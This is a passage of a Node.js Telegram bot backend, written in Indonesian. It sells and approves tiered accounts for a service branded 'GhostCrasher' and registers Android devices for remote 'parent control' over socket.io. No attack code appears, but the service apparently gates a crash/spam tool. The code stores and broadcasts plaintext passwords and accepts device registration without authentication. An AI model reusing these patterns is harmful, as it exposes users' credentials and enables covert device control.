〄  ${boldFont('Expired')}      : ${data.expiryDays} Hari (${expiryHours} Jam)
〄  ${boldFont('Request')}      : @${msg.from.username || userId}
〄  ${boldFont('Creator Role')} : ${data.creatorRole.toUpperCase()}
〄  ${boldFont('Berlaku')}      : ${new Date(expiredAt).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
${THEME_SEP_LONG}
⚠️  ${boldFont('HANYA DEVELOPER YANG BISA TERIMA/TOLAK!')}`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "✅  " + boldFont("Terima"), callback_data: `accrole_${reqId}` },
          { text: "❌  " + boldFont("Tolak"), callback_data: `tolakrole_${reqId}` }
        ]]
      }
    });

    pendingTransaksi[reqId] = {
      username: data.username,
      expiryDays: data.expiryDays,
      expiredDate: data.expiredDate,
      password: data.password,
      role: data.targetRole,
      creatorId: userId,
      creatorUsername: msg.from.username || userId,
      creatorRole: data.creatorRole,
      buktiTransfer: buktiTransfer,
      type: "create_role"
    };

    await bot.sendMessage(
      userId,
`✅ ${boldFont('Request Create Account Berhasil Dikirim')}
⏳ Mohon Ditunggu Konfirmasi Dari Developer`,
      { parse_mode: "HTML" }
    );

    delete pendingCreate[userId];
    return;
  }

  if (msg.reply_to_message) {
    const originalMsg = msg.reply_to_message;

    if (originalMsg.text && originalMsg.text.includes('Pembayaran Upgrade')) {
      const requests = loadUpgradeRequests();
      const pendingRequest = requests.find(
        r => String(r.userId) === userId && r.status === 'pending'
      );

      if (!pendingRequest) {
        return bot.sendMessage(
          chatId,
          "❌ Tidak ada request upgrade pending untuk kamu!",
          { parse_mode: "Markdown" }
        );
      }

      const photoId = msg.photo[msg.photo.length - 1].file_id;

      for (const devId of DEVELOPER_IDS) {
        await bot.sendPhoto(devId, photoId, {
          caption:
`<b>${boldFont('BUKTI TRANSFER UPGRADE')}</b>
${THEME_SEP_LONG}
〄  ${boldFont('ID')}           : #${pendingRequest.id}
〄  ${boldFont('User')}         : @${msg.from.username || userId} (${userId})
〄  ${boldFont('Current Role')} : <b>${pendingRequest.currentRole.toUpperCase()}</b>
〄  ${boldFont('Target Role')}  : <b>${pendingRequest.targetRole.toUpperCase()}</b>
〄  ${boldFont('Harga')}        : ${pendingRequest.priceFormatted}
${THEME_SEP_LONG}
⌕  ${boldFont('Gunakan /upgradelist untuk approve/reject')}`,
          parse_mode: "HTML"
        });
      }

      await bot.sendMessage(
        chatId,
        `✅ Bukti transfer berhasil dikirim!\n🆔 ID Request: #${pendingRequest.id}\n⏳ Tunggu konfirmasi dari Developer.`,
        { parse_mode: "Markdown" }
      );
    }
  }
});

// =====================================================
// 🔥 CALLBACK QUERY
// =====================================================
bot.on("callback_query", async (query) => {
const chatId = query.message.chat.id;
const data = query.data;
const userId = String(query.from.id);

// ===============================
// HANDLE UPGRADE REQUEST
// ===============================
if (data.startsWith("upgrade_")) {
  const upgradeKey = data.replace("upgrade_", "");
  const priceConfig = ROLE_PRICES[upgradeKey];

  if (!priceConfig) {
    return bot.answerCallbackQuery(query.id, {
      text: "❌ Upgrade tidak valid!",
      show_alert: true
    });
  }

  const users = loadDatabase();
  const user = users.find(u => String(u.creatorId) === userId);

  if (!user) {
    return bot.answerCallbackQuery(query.id, {
      text: "❌ Kamu tidak punya akun!",
      show_alert: true
    });
  }

  if (user.role !== priceConfig.from) {
    return bot.answerCallbackQuery(query.id, {
      text: `❌ Role kamu sekarang ${user.role}, bukan ${priceConfig.from}!`,
      show_alert: true
    });
  }

  const existingRequests = loadUpgradeRequests();
  const pending = existingRequests.find(
    r => String(r.userId) === userId && r.status === 'pending'
  );

  if (pending) {
    return bot.answerCallbackQuery(query.id, {
      text: `❌ Kamu sudah punya request upgrade pending! Tunggu diproses.`,
      show_alert: true
    });
  }

  const requestId = getNextRequestId();
  const newRequest = {
    id: requestId,
    userId: userId,
    username: query.from.username || query.from.first_name,
    currentRole: user.role,
    targetRole: priceConfig.to,
    upgradeKey: upgradeKey,
    price: priceConfig.price,
    priceFormatted: priceConfig.priceFormatted,
    status: 'pending',
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString()
  };

  const requests = loadUpgradeRequests();
  requests.push(newRequest);
  saveUpgradeRequests(requests);

  const qrisCaption =
`<b>${boldFont('PEMBAYARAN UPGRADE')}</b>
${THEME_SEP_LONG}
〄  ${boldFont('User')}  : @${query.from.username || userId}
〄  ${boldFont('Upgrade')}  : ${user.role.toUpperCase()} → ${priceConfig.to.toUpperCase()}
〄  ${boldFont('Harga')}  : ${priceConfig.priceFormatted}
〄  ${boldFont('ID')}     : #${requestId}
${THEME_SEP_LONG}
<b>${boldFont('Cara Bayar')}</b>
〄 1. Scan QRIS
〄 2. Transfer ${priceConfig.priceFormatted}
〄 3. Kirim bukti transfer reply ke pesan ini
〄 4. Tunggu konfirmasi Developer
${THEME_SEP_LONG}`;

  try {
    await bot.sendPhoto(chatId, QRIS_IMAGE_URL, {
      caption: qrisCaption,
      parse_mode: "HTML"
    });

    await bot.sendMessage(
      chatId,
      `✅ Request upgrade berhasil!\n🆔 ID: #${requestId}\n💰 Total: ${priceConfig.priceFormatted}\n📌 Kirim bukti transfer dengan reply ke pesan ini.`,
      { parse_mode: "Markdown" }
    );

    for (const devId of DEVELOPER_IDS) {
      bot.sendMessage(devId,
`📢 ${boldFont('REQUEST UPGRADE BARU')}
${THEME_SEP}
〄  ID: #${requestId}
〄  User: @${query.from.username || userId} (${userId})
〄  ${user.role.toUpperCase()} → ${priceConfig.to.toUpperCase()}
〄  Harga: ${priceConfig.priceFormatted}
〄  ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}`,
        { parse_mode: "HTML" }
      );
    }

    return bot.answerCallbackQuery(query.id, {
      text: `✅ Request upgrade ke ${priceConfig.to} berhasil! Kirim bukti transfer.`,
      show_alert: true
    });

  } catch (error) {
    console.error('Error sending QRIS:', error);
    return bot.answerCallbackQuery(query.id, {
      text: "❌ Gagal mengirim QRIS, hubungi Developer!",
      show_alert: true
    });
  }
}

// ===============================
// HANDLE APPROVE UPGRADE
// ===============================
if (data.startsWith("approve_upgrade_")) {
  const requestId = parseInt(data.replace("approve_upgrade_", ""));

  if (!isDeveloper(userId)) {
    return bot.answerCallbackQuery(query.id, {
      text: "❌ Hanya Developer yang bisa approve!",
      show_alert: true
    });
  }

  const requests = loadUpgradeRequests();
  const request = requests.find(r => r.id === requestId);

  if (!request) {
    return bot.answerCallbackQuery(query.id, {
      text: "❌ Request tidak ditemukan!",
      show_alert: true
    });
  }

  if (request.status !== 'pending') {
    return bot.answerCallbackQuery(query.id, {
      text: `❌ Request sudah ${request.status}!`,
      show_alert: true
    });
  }

  let users = loadDatabase();
  const user = users.find(u => String(u.creatorId) === String(request.userId));

  if (!user) {
    request.status = 'rejected';
    request.updatedAt = new Date().toISOString();
    saveUpgradeRequests(requests);
    return bot.answerCallbackQuery(query.id, {
      text: "❌ User tidak ditemukan!",
      show_alert: true
    });
  }

  const oldRole = user.role;
  user.role = request.targetRole;
  saveDatabase(users);

  request.status = 'approved';
  request.updatedAt = new Date().toISOString();
  saveUpgradeRequests(requests);

  let admins = loadAdmins();
  const targetUserId = Number(request.userId);

  for (const [role, ids] of Object.entries(admins)) {
    if (ids.includes(targetUserId)) {
      admins[role] = admins[role].filter(id => id !== targetUserId);
    }
  }

  const roleMap = {
    'reseller': 'resellers',
    'admin': 'admins',
    'owner': 'owners',
    'moderator': 'moderators',
    'staff': 'staff'
  };

  const newRoleKey = roleMap[request.targetRole];
  if (newRoleKey) {
    if (!admins[newRoleKey]) admins[newRoleKey] = [];
    if (!admins[newRoleKey].includes(targetUserId)) {
      admins[newRoleKey].push(targetUserId);
    }
  }

  saveAdmins(admins);

  try {
    await bot.editMessageCaption(
`✅ ${boldFont('UPGRADE DISETUJUI')}
${THEME_SEP_LONG}
〄  ID: #${request.id}
〄  User: @${request.username}
〄  ${oldRole.toUpperCase()} → ${request.targetRole.toUpperCase()}
〄  Harga: ${request.priceFormatted}
〄  Disetujui: Developer
〄  ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
${THEME_SEP_LONG}`,
      {
        chat_id: query.message.chat.id,
        message_id: query.message.message_id,
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: [] }
      }
    );
  } catch (e) {}

  await bot.sendMessage(
    request.userId,
`✅ ${boldFont('UPGRADE BERHASIL! 🎉')}
${THEME_SEP_LONG}
〄  ${boldFont('Username')}  : ${user.username}
〄  ${boldFont('Role Baru')} : <b>${request.targetRole.toUpperCase()}</b>
〄  ${boldFont('Expired')}   : ${user.expiredDate}
〄  Disetujui Oleh: Developer
${THEME_SEP_LONG}`,
    { parse_mode: "HTML" }
  );

  for (const devId of DEVELOPER_IDS) {
    await bot.sendDocument(
      devId,
      "./database/database.json",
      { caption: `📦 Database - ${user.username} → ${request.targetRole}` }
    );
    await bot.sendDocument(
      devId,
      "./database/admins.json",
      { caption: `📦 Admins - ${user.username} → ${request.targetRole}` }
    );
  }

  return bot.answerCallbackQuery(query.id, {
    text: `✅ ${user.username} diupgrade ke ${request.targetRole}!`,
    show_alert: true
  });
}

// ===============================
// HANDLE REJECT UPGRADE
// ===============================
if (data.startsWith("reject_upgrade_")) {
  const requestId = parseInt(data.replace("reject_upgrade_", ""));

  if (!isDeveloper(userId)) {
    return bot.answerCallbackQuery(query.id, {
      text: "❌ Hanya Developer yang bisa reject!",
      show_alert: true
    });
  }

  const requests = loadUpgradeRequests();
  const request = requests.find(r => r.id === requestId);

  if (!request) {
    return bot.answerCallbackQuery(query.id, {
      text: "❌ Request tidak ditemukan!",
      show_alert: true
    });
  }

  if (request.status !== 'pending') {
    return bot.answerCallbackQuery(query.id, {
      text: `❌ Request sudah ${request.status}!`,
      show_alert: true
    });
  }

  request.status = 'rejected';
  request.updatedAt = new Date().toISOString();
  saveUpgradeRequests(requests);

  try {
    await bot.editMessageCaption(
`❌ ${boldFont('UPGRADE DITOLAK')}
${THEME_SEP_LONG}
〄  ID: #${request.id}
〄  User: @${request.username}
〄  ${request.currentRole.toUpperCase()} → ${request.targetRole.toUpperCase()}
〄  Harga: ${request.priceFormatted}
〄  Ditolak: Developer
〄  ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
${THEME_SEP_LONG}`,
      {
        chat_id: query.message.chat.id,
        message_id: query.message.message_id,
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: [] }
      }
    );
  } catch (e) {}

  await bot.sendMessage(
    request.userId,
`❌ ${boldFont('UPGRADE DITOLAK')}
${THEME_SEP_LONG}
〄  ID: #${request.id}
〄  Target: ${request.targetRole.toUpperCase()}
⌕  Silahkan coba lagi atau hubungi Developer.
${THEME_SEP_LONG}`,
    { parse_mode: "HTML" }
  );

  return bot.answerCallbackQuery(query.id, {
    text: `❌ Request #${request.id} ditolak!`,
    show_alert: true
  });
}

// ===============================
// SELF CREATE
// ===============================
if (data.startsWith("selfcreate_")) {

const hasValidRole = isDeveloper(userId) || isStaff(userId) ||
                      isModerator(userId) || isOwner(userId) ||
                      isAdmin(userId) || isReseller(userId) ||
                      isPremium(userId);

if (!hasValidRole) {
  return bot.answerCallbackQuery(query.id, {
    text: "❌ Kamu tidak punya akses!",
    show_alert: true
  });
}

const [username, expiryDays, password, expiredDate] =
  data.replace("selfcreate_","").split("_");

let users = loadDatabase();

const sudahAda = users.some(
  u => String(u.creatorId) === userId && u.type === "self"
);

if (sudahAda) {
  return bot.answerCallbackQuery(query.id, {
    text: "❌ Hanya boleh create 1x!",
    show_alert: true
  });
}

let role = "member";
if (isDeveloper(userId)) role = "developer";
else if (isStaff(userId)) role = "staff";
else if (isModerator(userId)) role = "moderator";
else if (isOwner(userId)) role = "owner";
else if (isAdmin(userId)) role = "admin";
else if (isReseller(userId)) role = "reseller";

users.push({
  username,
  password,
  role,
  creatorId: userId,
  type: "self",
  expiredDate: expiredDate
});

saveDatabase(users);

addActivityLog(userId, 'self_create_account', {
  username: username,
  role: role,
  expiryDays: expiryDays,
  expiredDate: expiredDate,
  type: "self"
});

const expiryHours = parseInt(expiryDays) * 24;
const expiredAt = new Date(expiredDate).getTime();

DEVELOPER_IDS.forEach(id => {
  bot.sendMessage(id,
`✅ ${boldFont('AKUN BARU (SELF CREATE)')}
${THEME_SEP_LONG}
〄  ${boldFont('Username')} : ${username}
〄  ${boldFont('Password')} : ${password}
〄  ${boldFont('Role')}     : ${role}
〄  ${boldFont('Expired')}  : ${expiryDays} hari
〄  ${boldFont('Berlaku')}  : ${new Date(expiredAt).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
〄  ${boldFont('TYPE')}     : SELF
${THEME_SEP_LONG}`,
{ parse_mode: "HTML" });

  bot.sendDocument(
    id,
    "./database/database.json",
    { caption: "📦 Backup database (Self Create)" }
  );
});

bot.editMessageText(
`✅ ${boldFont('AKUN BERHASIL DIBUAT')}
${THEME_SEP_LONG}
〄  Username: ${username}
〄  Password: ${password}
〄  Role: ${role}
〄  Expired: ${expiryDays} hari
〄  TYPE: SELF CREATE
${THEME_SEP_LONG}`,
{
  chat_id: chatId,
  message_id: query.message.message_id,
  parse_mode: "HTML"
});

return bot.answerCallbackQuery(query.id, {
  text: `✅ Akun ${username} dibuat!`,
  show_alert: true
});
}

// ===============================
// CREATE DENGAN ROLE
// ===============================
if (data.startsWith("create_")) {
  const parts = data.replace("create_", "").split("_");
  const targetRole = parts[0];
  const username = parts[1];
  const expiryDays = parseInt(parts[2]);
  const password = parts[3];
  const expiredDate = parts.slice(4).join("_");

  let creatorRole = 'member';
  if (isDeveloper(userId)) creatorRole = 'developer';
  else if (isStaff(userId)) creatorRole = 'staff';
  else if (isModerator(userId)) creatorRole = 'moderator';
  else if (isOwner(userId)) creatorRole = 'owner';
  else if (isAdmin(userId)) creatorRole = 'admin';
  else if (isReseller(userId)) creatorRole = 'reseller';

  const availableRoles = getAvailableRolesForCreator(creatorRole);

  if (!availableRoles.includes(targetRole)) {
    return bot.answerCallbackQuery(query.id, {
      text: `❌ Kamu tidak bisa membuat role ${targetRole}!`,
      show_alert: true
    });
  }

  if (availableRoles.includes(targetRole)) {
    pendingCreate[userId] = {
      username,
      expiryDays: expiryDays,
      expiredDate: expiredDate,
      password,
      role: targetRole,
      stage: "waiting_bukti_create_role",
      creatorRole: creatorRole,
      targetRole: targetRole,
      type: "buyer"
    };

    await bot.sendMessage(
      chatId,
`📤 ${boldFont('KIRIM BUKTI STORAN')}
${THEME_SEP_LONG}
〄  Username: ${username}
〄  Role: ${targetRole.toUpperCase()}
〄  Expired: ${expiryDays} Hari
〄  Creator: @${query.from.username || userId}
〄  Creator Role: ${creatorRole.toUpperCase()}
${THEME_SEP_LONG}
📌 ${boldFont('Kirim Foto Bukti Storan!')}`,
      { parse_mode: "HTML" }
    );

    return bot.answerCallbackQuery(query.id, {
      text: "✅ Kirim bukti storan!",
      show_alert: true
    });
  }
}

// ===============================
// ACCEPT TRANSAKSI BUYER
// ===============================
if (data.startsWith("acctrx_")) {
  const reqId = data.replace("acctrx_", "");
  const trx = pendingTransaksi[reqId];

  if (!trx) return;

  if (!isDeveloper(userId)) {
    return bot.answerCallbackQuery(query.id, {
      text: "❌ Hanya Developer yang bisa approve transaksi!",
      show_alert: true
    });
  }

  const accName = query.from.username || query.from.first_name;
  const expiryHours = trx.expiryDays * 24;
  const expiredAt = new Date(trx.expiredDate).getTime();

  bot.editMessageCaption(
`✅ ${boldFont('TRANSAKSI DISETUJUI')}
${THEME_SEP_LONG}
〄  ${trx.username}
〄  ${trx.expiryDays} Hari (${expiryHours} Jam)
〄  Request: @${trx.creatorUsername}
〄  ${new Date(expiredAt).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
〄  Disetujui: @${accName}
${THEME_SEP_LONG}`,
{
  chat_id: query.message.chat.id,
  message_id: query.message.message_id,
  parse_mode: "HTML",
  reply_markup: { inline_keyboard: [] }
});

  let users = loadDatabase();
  users.push({
    username: trx.username,
    password: trx.password,
    role: trx.role || "member",
    creatorId: trx.creatorId,
    creatorUsername: trx.creatorUsername,
    type: "buyer",
    expiredDate: trx.expiredDate
  });

  saveDatabase(users);

  addActivityLog(trx.creatorUsername, 'buyer_create_account', {
    username: trx.username,
    role: trx.role || "member",
    expiryDays: trx.expiryDays,
    approved_by: accName,
    expiredDate: trx.expiredDate,
    type: "buyer"
  });

  DEVELOPER_IDS.forEach(id => {
    bot.sendMessage(id,
`✅ ${boldFont('BUYER CREATE ACC')}
${THEME_SEP}
〄  ${trx.username}
〄  ${trx.password}
〄  ${trx.role || "member"}
〄  ${trx.expiryDays} Hari
〄  Creator: @${trx.creatorUsername}
〄  Disetujui: @${accName}`,
{ parse_mode: "HTML" });

    bot.sendDocument(
      id,
      "./database/database.json",
      { caption: "📦 Backup database (Buyer Create)" }
    );
  });

  bot.sendMessage(
    trx.creatorId,
`✅ ${boldFont('AKUN BERHASIL DIBUAT')}
${THEME_SEP_LONG}
〄  Username: ${trx.username}
〄  Password: ${trx.password}
〄  Role: Member
〄  Expired: ${trx.expiryDays} Hari
〄  TYPE: BUYER
〄  Disetujui: @${accName}
${THEME_SEP_LONG}`,
{ parse_mode: "HTML" }
);

  delete pendingTransaksi[reqId];
  return bot.answerCallbackQuery(query.id);
}

// ===============================
// TOLAK TRANSAKSI BUYER
// ===============================
if (data.startsWith("tolaktrx_")) {
  const reqId = data.replace("tolaktrx_", "");
  const trx = pendingTransaksi[reqId];

  if (!trx) return;

  if (!isDeveloper(userId)) {
    return bot.answerCallbackQuery(query.id, {
      text: "❌ Hanya Developer yang bisa menolak transaksi!",
      show_alert: true
    });
  }

  const accName = query.from.username || query.from.first_name;
  const expiryHours = trx.expiryDays * 24;
  const expiredAt = new Date(trx.expiredDate).getTime();

  bot.editMessageCaption(
`❌ ${boldFont('TRANSAKSI DITOLAK')}
${THEME_SEP_LONG}
〄  ${trx.username}
〄  ${trx.expiryDays} Hari
〄  Request: @${trx.creatorUsername}
〄  Ditolak: @${accName}
${THEME_SEP_LONG}`,
{
  chat_id: query.message.chat.id,
  message_id: query.message.message_id,
  parse_mode: "HTML",
  reply_markup: { inline_keyboard: [] }
});

  bot.sendMessage(
    trx.creatorId,
    `❌ Transaksi ditolak oleh @${accName}`
  );

  delete pendingTransaksi[reqId];
  return bot.answerCallbackQuery(query.id);
}

// ===============================
// ACCEPT CREATE ROLE
// ===============================
if (data.startsWith("accrole_")) {
  const reqId = data.replace("accrole_", "");
  const trx = pendingTransaksi[reqId];

  if (!trx) return;

  if (!isDeveloper(userId)) {
    return bot.answerCallbackQuery(query.id, {
      text: "❌ Hanya Developer yang bisa approve transaksi!",
      show_alert: true
    });
  }

  const accName = query.from.username || query.from.first_name;
  const expiryHours = trx.expiryDays * 24;
  const expiredAt = new Date(trx.expiredDate).getTime();

  bot.editMessageCaption(
`✅ ${boldFont('CREATE AKUN DISETUJUI')}
${THEME_SEP_LONG}
〄  ${trx.username}
〄  Role: ${trx.role.toUpperCase()}
〄  ${trx.expiryDays} Hari (${expiryHours} Jam)
〄  Request: @${trx.creatorUsername}
〄  Creator Role: ${trx.creatorRole.toUpperCase()}
〄  TYPE: BUYER
〄  ${new Date(expiredAt).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
〄  Disetujui: @${accName}
${THEME_SEP_LONG}`,
{
  chat_id: query.message.chat.id,
  message_id: query.message.message_id,
  parse_mode: "HTML",
  reply_markup: { inline_keyboard: [] }
});

  let users = loadDatabase();

  users.push({
    username: trx.username,
    password: trx.password,
    role: trx.role,
    creatorId: trx.creatorId,
    creatorUsername: trx.creatorUsername,
    type: "buyer",
    expiredDate: trx.expiredDate
  });

  saveDatabase(users);

  let admins = loadAdmins();
  const targetUserId = Number(trx.creatorId);

  for (const [role, ids] of Object.entries(admins)) {
    if (ids.includes(targetUserId)) {
      admins[role] = admins[role].filter(id => id !== targetUserId);
    }
  }

  const roleMap = {
    'reseller': 'resellers',
    'admin': 'admins',
    'owner': 'owners',
    'moderator': 'moderators',
    'staff': 'staff',
    'premium': 'premium',
    'member': 'members'
  };

  const newRoleKey = roleMap[trx.role];
  if (newRoleKey && trx.role !== 'member') {
    if (!admins[newRoleKey]) admins[newRoleKey] = [];
    if (!admins[newRoleKey].includes(targetUserId)) {
      admins[newRoleKey].push(targetUserId);
    }
  }
  saveAdmins(admins);

  addActivityLog(trx.creatorUsername, 'create_account_with_role', {
    username: trx.username,
    role: trx.role,
    expiryDays: trx.expiryDays,
    approved_by: accName,
    creator_role: trx.creatorRole,
    expiredDate: trx.expiredDate,
    type: "buyer"
  });

  DEVELOPER_IDS.forEach(id => {
    bot.sendMessage(id,
`✅ ${boldFont('CREATE AKUN (BUYER - DENGAN ROLE)')}
${THEME_SEP}
〄  ${trx.username}
〄  ${trx.password}
〄  ${trx.role.toUpperCase()}
〄  ${trx.expiryDays} Hari
〄  Creator: @${trx.creatorUsername}
〄  Creator Role: ${trx.creatorRole.toUpperCase()}
〄  TYPE: BUYER
〄  Disetujui: @${accName}`,
{ parse_mode: "HTML" });

    bot.sendDocument(
      id,
      "./database/database.json",
      { caption: "📦 Backup database (Create With Role - Buyer)" }
    );

    bot.sendDocument(
      id,
      "./database/admins.json",
      { caption: "📦 Backup admins.json (Create With Role - Buyer)" }
    );
  });

  bot.sendMessage(
    trx.creatorId,
`✅ ${boldFont('AKUN BERHASIL DIBUAT')}
${THEME_SEP_LONG}
〄  Username: ${trx.username}
〄  Password: ${trx.password}
〄  Role: ${trx.role.toUpperCase()}
〄  Expired: ${trx.expiryDays} Hari
〄  TYPE: BUYER
〄  Disetujui: @${accName}
${THEME_SEP_LONG}`,
{ parse_mode: "HTML" }
);

  delete pendingTransaksi[reqId];
  return bot.answerCallbackQuery(query.id);
}

// ===============================
// REJECT CREATE ROLE
// ===============================
if (data.startsWith("tolakrole_")) {
  const reqId = data.replace("tolakrole_", "");
  const trx = pendingTransaksi[reqId];

  if (!trx) return;

  if (!isDeveloper(userId)) {
    return bot.answerCallbackQuery(query.id, {
      text: "❌ Hanya Developer yang bisa menolak transaksi!",
      show_alert: true
    });
  }

  const accName = query.from.username || query.from.first_name;
  const expiredAt = new Date(trx.expiredDate).getTime();

  bot.editMessageCaption(
`❌ ${boldFont('CREATE AKUN DITOLAK')}
${THEME_SEP_LONG}
〄  ${trx.username}
〄  Role: ${trx.role.toUpperCase()}
〄  ${trx.expiryDays} Hari
〄  Request: @${trx.creatorUsername}
〄  Ditolak: @${accName}
${THEME_SEP_LONG}`,
{
  chat_id: query.message.chat.id,
  message_id: query.message.message_id,
  parse_mode: "HTML",
  reply_markup: { inline_keyboard: [] }
});

  bot.sendMessage(
    trx.creatorId,
    `❌ Create akun ditolak oleh @${accName}`
  );

  delete pendingTransaksi[reqId];
  return bot.answerCallbackQuery(query.id);
}

});

// =====================================================
// 🔥 LIST USER
// =====================================================
bot.onText(/^\/listuser$/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!hasAccess(userId)) {
    return bot.sendMessage(chatId, "❌ No permission!");
  }

  const users = loadDatabase();
  const userStatus = getUserStatus(userId);

  let filteredUsers = users;
  if (userStatus === 'Reseller') {
    filteredUsers = users.filter(u => u.role === 'member');
  } else if (userStatus === 'Admin') {
    filteredUsers = users.filter(u => u.role === 'member' || u.role === 'reseller');
  }

  if (filteredUsers.length === 0) {
    return bot.sendMessage(chatId, "📭 No users found.");
  }

  const buttons = filteredUsers.map(u => {
    return [{ text: `〄  ${u.username}  ·  ${u.role}`, callback_data: `view_${u.username}` }];
  });

  bot.sendMessage(chatId,
`<b>${boldFont('LIST USER')}</b>
${THEME_SEP_LONG}
〄  Total : <b>${filteredUsers.length}</b> user
${THEME_SEP_LONG}`,
  {
    parse_mode: "HTML",
    reply_markup: { inline_keyboard: buttons }
  });
});

// =====================================================
// 🔥 CLEANUP UPGRADE REQUESTS
// =====================================================
function cleanupUpgradeRequests() {
  const requests = loadUpgradeRequests();
  const sevenDaysAgo = new Date(Date.now() - 7 * 24 * 60 * 60 * 1000);

  const filtered = requests.filter(r => {
    return new Date(r.createdAt) > sevenDaysAgo || r.status !== 'pending';
  });

  if (filtered.length !== requests.length) {
    saveUpgradeRequests(filtered);
    console.log(`🧹 [UPGRADE] Cleaned ${requests.length - filtered.length} old requests`);
  }
}

setInterval(cleanupUpgradeRequests, 60 * 60 * 1000);

// =====================================================
// 🔥 NOTIFIKASI
// =====================================================
bot.onText(/^\/notif (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isDeveloper(userId)) {
    return bot.sendMessage(chatId, "❌ Hanya Developer!");
  }

  const message = match[1];
  let title = "GhostCrasher";
  let body = message;

  if (message.includes('|')) {
    const parts = message.split('|');
    title = parts[0].trim();
    body = parts[1].trim();
  }

  const NOTIF_FILE = path.join(DATABASE_DIR, 'notifications.json');
  let notifications = [];

  if (fs.existsSync(NOTIF_FILE)) {
    try {
      const raw = fs.readFileSync(NOTIF_FILE, 'utf8');
      const parsed = JSON.parse(raw);
      notifications = Array.isArray(parsed) ? parsed : [];
    } catch (e) {
      notifications = [];
    }
  }

  notifications.unshift({
    id: Date.now().toString(),
    title: title,
    body: body,
    timestamp: new Date().toISOString(),
    sender: msg.from.username || "Developer",
  });

  if (notifications.length > 100) notifications.splice(100);
  fs.writeFileSync(NOTIF_FILE, JSON.stringify(notifications, null, 2));

  let pushStatus = 'FCM belum dikonfigurasi';
  if (firebaseAdmin && firebaseAdmin.apps.length > 0) {
    try {
      // Ambil URL HTTPS pertama dari pengumuman agar saat notification
      // ditekan aplikasi dapat meneruskannya langsung ke Chrome.
      const urlMatch = String(body).match(/https?:\/\/[^\s]+/i);
      const notificationUrl = urlMatch
        ? urlMatch[0].replace(/[),.]+$/, '')
        : '';

      const messageId = await firebaseAdmin.messaging().send({
        topic: 'developer_notifications',
        notification: { title: String(title), body: String(body) },
        data: {
          notificationId: String(notifications[0].id),
          title: String(title),
          body: String(body),
          url: notificationUrl,
        },
        android: {
          priority: 'high',
          notification: {
            channelId: 'developer_notifications',
            sound: 'default',
            clickAction: 'FLUTTER_NOTIFICATION_CLICK',
          },
        },
      });
      pushStatus = `FCM terkirim (${messageId})`;
      console.log(`[FCM] Notifikasi developer terkirim: ${messageId}`);
    } catch (err) {
      pushStatus = `FCM gagal: ${err.message}`;
      console.log('[FCM] Gagal kirim push:', err.message);
    }
  }

  await bot.sendMessage(chatId,
`📢 ${boldFont('NOTIFIKASI TERKIRIM')}
${THEME_SEP_LONG}
〄  ${boldFont('Judul')}  : ${title}
〄  ${boldFont('Isi')}    : ${body}
〄  ${boldFont('Push')}  : ${pushStatus}
${THEME_SEP_LONG}`,
    { parse_mode: "HTML" }
  );
});


// =====================================================
// PARENT CONTROL TRANSPORT
// Aman untuk kontrol perangkat milik akun yang sedang login.
// Tidak mengambil handler spam/crash dari server_pop.
// =====================================================
function getControlUserByToken(token) {
  if (!token || !activeKeys[token]) return null;
  const keyInfo = activeKeys[token];
  const db = loadDatabase();
  return db.find(u => u.username === keyInfo.username) || null;
}

function controlDeviceList(uid, pairingId = null) {
  return Object.values(controlDevices)
    .filter(d => pairingId
      ? String(d.pairingId || d.uid || "") === String(pairingId)
      : String(d.uid) === String(uid))
    .map(d => ({
      id: d.id,
      name: d.name || d.model || "Unknown Device",
      model: d.model || d.name || "Unknown",
      status: d.status || "Offline",
      battery: d.battery || 0,
      lastSeen: d.lastSeen || null,
      androidVersion: d.androidVersion || "Unknown",
      pairingId: d.pairingId || d.uid || null,
    }));
}

function broadcastControlDevices(uid, pairingId = null) {
  const list = controlDeviceList(uid, pairingId);
  controlIO.sockets.sockets.forEach(sock => {
    if (String(sock.data?.uid || "") === String(uid) ||
        (pairingId && String(sock.data?.pairingId || "") === String(pairingId))) {
      sock.emit("devices:update", list);
    }
  });
}

controlIO.on("connection", (socket) => {
  const queryToken = socket.handshake?.query?.token;
  const token = Array.isArray(queryToken) ? queryToken[0] : queryToken;
  const user = getControlUserByToken(token);

  if (user) {
    socket.data.uid = user.uid || user.username;
    socket.data.username = user.username;
    controlControllers.set(socket.id, socket.data.uid);
    const pairingId = String(socket.handshake?.query?.pairingId || "").trim();
    if (pairingId && controlPairings[pairingId] === String(socket.data.uid)) socket.data.pairingId = pairingId;
    socket.emit("devices:update", controlDeviceList(socket.data.uid, socket.data.pairingId || null));
  }

  socket.on("controller:join", (data = {}) => {
    const joinUser = getControlUserByToken(data.token);
    if (!joinUser) {
      socket.emit("auth:error", { message: "Unauthorized" });
      return;
    }
    socket.data.uid = joinUser.uid || joinUser.username;
    socket.data.username = joinUser.username;
    controlControllers.set(socket.id, socket.data.uid);
    const pairingId = String(data.pairingId || "").trim();
    if (pairingId && controlPairings[pairingId] === String(socket.data.uid)) socket.data.pairingId = pairingId;
    socket.emit("devices:update", controlDeviceList(socket.data.uid, socket.data.pairingId || null));
  });

  socket.on("device:register", (data = {}) => {
    const { deviceId, name, battery, uid, sdkVersion, androidVersion, charging } = data;
    if (!deviceId || !uid) return;

    const db = loadDatabase();
    const owner = db.find(u => String(u.uid || "") === String(uid));
    const pairingId = String(uid).trim();
    if (!pairingId) return;

    controlDevices[deviceId] = {
      ...(controlDevices[deviceId] || {}),
      id: deviceId,
      uid: owner ? owner.uid : pairingId,
      pairingId,
      name: name || deviceId,
      model: name || deviceId,
      battery: Number(battery || 0),
      status: "Online",
      charging: Boolean(charging),
      sdkVersion: sdkVersion || 0,
      androidVersion: androidVersion || "Unknown",
      socketId: socket.id,
      lastSeen: new Date().toISOString(),
    };
    saveControlDevices();
    socket.join(`control-device:${deviceId}`);
